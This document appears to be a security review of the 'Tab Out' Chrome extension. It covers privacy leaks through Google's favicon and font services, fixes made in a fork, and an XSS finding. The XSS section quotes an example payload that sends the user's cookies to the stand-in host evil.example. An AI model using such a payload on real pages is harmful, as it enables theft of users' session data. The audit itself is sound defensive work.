# Security Analysis: zarazhangrui/tab-out

**Reviewed:** 2026-04-15  
**Fork:** https://github.com/vliggio/tab-out  
**Source:** https://github.com/zarazhangrui/tab-out  

---

## Overview

Tab Out is a Chrome extension (Manifest V3) that replaces the new tab page with a dashboard grouping open tabs by domain. It is written in plain JavaScript (~900 lines), HTML, and CSS with no build step or npm dependencies.

---

## Permissions

```json
"permissions": ["tabs", "activeTab", "storage"]
```

These are minimal and appropriate. The extension cannot read page content, inject scripts into sites, or intercept network traffic. No `host_permissions` are declared.

---

## Findings

### Medium — Google favicon API leaks all open tab domains

**Files:** `extension/app.js` lines 770, 851, 969

```js
// Original code — fired once per unique domain across all open tabs
const faviconUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=16`;
```

Every time the user opens a new tab, the extension renders all open tabs as cards and fires one image request per unique domain to Google's favicon service. Each request carries:

- The user's IP address
- The domain of the tab (e.g. `yourbank.com`, `patientportal.hospital.com`)
- A timestamp correlated with each new tab open
- The user's Google session cookies if signed into any Google service, linking the request to their Google account identity

This gives Google a continuous, real-time feed of what domains the user has open — including sensitive sites that may have no Google relationship of their own (banking, medical portals, HR systems, legal research, job boards).

**Fix applied:** Replaced with DuckDuckGo's favicon API (`https://icons.duckduckgo.com/ip3/${domain}.ico`), which has no ad-targeting business model and does not share an identity surface with a major ad network.

---

### Low — Google Fonts leaks IP on every new tab open

**File:** `extension/index.html` lines 9–10

```html
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Newsreader:...&family=DM+Sans:...&display=swap" rel="stylesheet">
```

Each new tab load triggers a request to Google Fonts. Google receives the user's IP and can infer new tab open frequency and timing. Less severe than the favicon issue since no tab content is exposed, but it is an unnecessary third-party call.

**Fix applied:** Removed both link tags. Replaced `'DM Sans'` with `-apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif` and `'Newsreader'` with `'Iowan Old Style', 'Palatino Linotype', Palatino, 'Book Antiqua', Georgia, serif` in `extension/style.css` (7 occurrences).

---

### Low — XSS via unescaped tab titles in innerHTML

**Files:** `extension/app.js` lines 773, 853, 977, 999

Tab titles from open pages are processed and inserted into `innerHTML` without HTML-escaping. Examples:

```js
// renderArchiveItem — unescaped:
${item.title || item.url}

// renderDomainCard chip — unescaped:
<span class="chip-text">${label}</span>
```

If a malicious page sets its document title to a string containing HTML (e.g. `<img src=x onerror=fetch('https://evil.example/'+btoa(document.cookie))>`), and the user has that tab open while viewing their new tab page, the payload would execute in the extension page context. That context has access to `chrome.tabs` and `chrome.storage`.

**Severity is low** because: (a) it requires the user to have a tab open with a crafted title, (b) `chrome.storage` only contains saved-for-later URLs the user saved themselves, and (c) the `tabs` permission cannot read page content — only URLs and titles that are already visible in the dashboard. No fix applied in the fork; a future hardening pass could use `textContent` assignments or a `sanitize()` helper instead of template literals into `innerHTML`.

---

## What Was Not Found

- No data exfiltration to any server controlled by the extension author
- No analytics or telemetry
- No obfuscated code
- No remote script loading
- No use of `eval()` or `Function()` constructor
- No broad `host_permissions`
- `config.local.js` is gitignored and loaded with a silent `onerror` — personal config cannot be accidentally committed

---

## Summary

The extension is not spyware. The author has no server-side component receiving user data. The primary real-world risk is structural: the Google favicon API creates a passive, continuous data leak to Google tied to the user's identity. This was fixed in the fork. The Google Fonts dependency was also removed. The XSS finding is noted but low-priority given the constrained impact.

---

## Changes Made in Fork

| File | Change |
|---|---|
| `extension/app.js` | Replaced 3 Google favicon API calls with DuckDuckGo favicon API |
| `extension/index.html` | Removed Google Fonts `<link>` tags |
| `extension/style.css` | Replaced `'DM Sans'` and `'Newsreader'` with system font stacks (7 occurrences) |

**To use the fork:** Open `chrome://extensions`, enable Developer mode, click "Load unpacked", select the `extension/` directory from the cloned fork.
